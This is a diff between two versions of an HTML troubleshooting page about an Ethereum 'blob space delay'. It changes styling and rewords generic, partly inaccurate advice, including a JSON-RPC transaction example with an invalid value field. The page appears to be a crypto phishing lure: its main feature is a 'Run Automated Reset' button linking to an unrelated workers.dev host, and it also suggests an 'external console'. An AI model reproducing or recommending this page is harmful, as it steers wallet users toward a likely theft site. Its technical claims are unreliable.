@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Ethereum Blob Space Delay</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: sans-serif;
         background: #121214;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,30 +41,41 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating a "blob space delay" or similar phrases, which may be accompanied by increased transaction fees and slower block confirmation times.</li>
+<li>Users experience delayed or failed transactions on the Ethereum network, with error messages indicating a "blob space delay" or similar issues related to excessive data storage.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The Ethereum blob space delay occurs due to the network's limited capacity to process and store large amounts of data, particularly when there is a high volume of transactions competing for space in each block, thereby causing congestion and delays.</li>
+<li>The error occurs due to the Ethereum network's limitations on the amount of data that can be stored in a single block, leading to congestion and delays when a large number of transactions require significant storage space.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas limit to prioritize transactions: <code>eth_sendTransaction({from: '0x...', to: '0x...', value: '1 ether', gas: '2000000'})</code></li>
-<li>Utilize layer 2 scaling solutions to offload transactions from the mainnet</li>
-<li>Implement a queue system to manage and prioritize transactions, example:</li>
+<li>Increase the gas limit to prioritize transactions and potentially alleviate congestion: </li>
+<li><code>eth_estimateGas</code> to estimate the gas required for a transaction</li>
+<li><code>eth_sendTransaction</code> with a higher gas price to prioritize the transaction</li>
+<li>Using a custom JSON-RPC request, such as:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>http://localhost:8545<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;:[{&quot;from&quot;:&quot;0x...&quot;,&quot;to&quot;:&quot;0x...&quot;,&quot;value&quot;:&quot;1 ether&quot;,&quot;gas&quot;:&quot;2000000&quot;}],&quot;id&quot;:1}&#39;</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_sendTransaction&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x... sender address ...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;to&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x... recipient address ...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x... value ...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;gas&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x... increased gas limit ...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;gasPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x... increased gas price ...&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external console for more advanced troubleshooting and diagnostics.</p>
+<p>Consider utilizing an external console for more advanced troubleshooting and customization options. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A basic understanding of Ethereum network architecture</li>
-<li>Familiarity with gas management and transaction prioritization</li>
-<li>Access to a node or wallet with the necessary permissions to send transactions and adjust settings</li>
+<li>A basic understanding of Ethereum transaction mechanics</li>
+<li>Access to a JSON-RPC endpoint or an Ethereum client</li>
+<li>Familiarity with gas management and transaction prioritization strategies</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
